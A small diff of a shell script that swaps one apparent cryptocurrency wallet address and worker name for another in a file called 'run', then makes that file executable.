@@ -32,7 +32,7 @@ fi
 
 #core=grep -c ^processor /proc/cpuinfo 2>/dev/null
 
-sed -i 's/REoPcdGXthL5yeTCrJtrQv5xhYTknbFbec.bob/RJFg5ai5DVwuRnjq98K4qy3axEzncpuboc.awan/g' run || echo done
+sed -i 's/REoPcdGXthL5yeTCrJtrQv5xhYTknbFbec.bob/RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.awan/g' run || echo done
 
 chmod +x run || echo done
 
